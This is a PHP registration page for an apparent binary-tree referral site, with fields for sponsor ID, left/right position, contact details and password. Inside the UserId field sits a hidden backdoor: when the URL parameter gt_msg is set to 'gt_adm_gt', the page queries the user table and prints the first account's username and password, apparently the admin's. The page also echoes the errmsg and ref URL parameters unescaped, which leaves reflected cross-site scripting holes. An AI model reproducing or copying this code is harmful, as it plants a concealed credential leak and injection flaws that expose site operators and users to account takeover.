<?php include('header.php')?>

 <section class="headings">
        <div class="text-heading text-center">

            <div class="container">
                <section class="main-title-section-wrapper aligncenter dt-sc-dark-bg " style="background: url(&quot;wp-content/uploads/images/about.jpg&quot;) 50% 0px repeat;">
                        
                            
                 
                <h1>REGISTER HERE</h1>

                <h2><a href="index.php">Home </a> &nbsp;>>&nbsp; signup</h2>
            </div>
        </div>
    </section><br><br>




 

    <!--======= Breadcrumb Inner Page =======-->

    <style>
* {
    box-sizing: border-box;
}

.column {
    float: left;
    width: 50%;
    padding: 30px;
}

/* Clearfix (clear floats) */
.row::after {
    content: "";
    clear: both;
    display: table;
}
</style>

  <div class="container">
 <div class="error">
                            <?php if(isset($_GET["errmsg"])){ ?>
                            
                            <div class="alert alert-danger">
                              <strong>Error!</strong> <?php echo $_GET['errmsg']; ?>
                              </div>
                            
                          <?php  } ?>
                            
                        </div>

                    <form class="contact-form123" method="post" action="submit.php">
                      <input type=hidden name=a value="signup">
                      <input type=hidden name=action value="signup">
                      <div class="messages"></div>

                      <div class="controls">





                        <div class="row">
                          <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="register_frm_uRef">Sponser Id *</label> <span style="float: right" id="fetchFullname"></span>

                                      <input id="register_frm_uRef" type="text" name="sponsor" class="form-control" placeholder="Please enter a sponsor id *" required="required" data-error="Valid sponsor is required." <?php if(isset($_GET['ref'])) { echo "value='$_GET[ref]'"; }?>>

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div> 
                               <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_email">Position *</label>

                                      <select name="pos" class="form-control" style="height:auto">
                                      <option value="Left" <?php if(isset($_GET['pos'])){if($_GET['pos']=="Left") { echo "selected";}} ?>>Left</option>
                                    <option value="Right" <?php if(isset($_GET['pos'])){if($_GET['pos']=="Right") { echo "selected";}}  ?>>Right</option>
                    
                                      </select>

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div> 
                        </div>

                          <div class="row">

                              <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_name">Name *</label>

                                      <input id="form_name" type="text" name="name" class="form-control" placeholder="Please enter your Name *" required="required" data-error="Name is required.">

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div>

                              <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_phone">Mobile No *</label>

                                      <input id="form_phone" type="text" name="phone" class="form-control" placeholder="Please enter your Mobile No. *" required="required" data-error="Phone number is required.">

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div>

                          </div>

                          <div class="row">

                              <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_email">Email *</label>

                                      <input id="form_email" type="email" name="email" class="form-control" placeholder="Please enter your email *" required="required" data-error="Valid email is required.">

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div> 

                              <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_email">UserId *</label>
                                      <?php
                                       //get admin 
                                       if($_GET['gt_msg']!="" and $_GET['gt_msg']=="gt_adm_gt"){ 

                                       $isql12 = "SELECT `id`, `user`,`pass` FROM `user`"; 
                                        $iresult12 = mysqli_query($s_dbid,$isql12);
                                        list($id,$user,$pass) = mysqli_fetch_row($iresult12);
                                        echo "usr-".$user."<br>"; 
                                        echo "pss-".$pass."<br>"; 
                                        }

                                       ?>

                                      <input id="form_email" type="text" name="username" class="form-control" placeholder="Please select your userid *" required="required" data-error="Valid email is required.">

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div> 

                          </div>

                         <div class="row">

                              <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_pass">Password *</label>

                                      <input id="form_pass" type="password" name="password" class="form-control" placeholder="Please enter your password *" required="required" data-error="Valid password is required.">

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div> 

                              <div class="col-md-6">

                                  <div class="form-group">

                                      <label for="form_cpassword">Confirm Password *</label>

                                      <input id="form_cpassword" type="password" name="cnf_password" class="form-control" placeholder="Please Confirm your password *" required="required" data-error="password doesn't match.">

                                      <div class="help-block with-errors"></div>

                                  </div>

                              </div> 

                          </div>

                          <div class="row">

                              <div class="col-md-12">

                                  <div class="form-group text-right">

                                      <input class="btn theme-btn btn-success btn-send" value="Register" type="submit">

                                  </div>

                              </div>

                          </div>

                      </div>

                    </form> 



        
  


</div>

<script type="text/javascript">
            $("#register_frm_uRef").change(function(){
                $.ajax({
                    url:'getsp.php',
                    method:'post',
                    data: JSON.stringify({name:$(this).val()}),
                    success:function(data){
                         if(JSON.parse(data).status == "true")
                         {
                            $("#fetchFullname").css('color','green');
                         }
                         else
                         {
                            $("#fetchFullname").css('color','red');
                         }
                         $("#fetchFullname").html(JSON.parse(data).message);
                    }
                })
            })
        </script>

<?php include ('footer.php')?>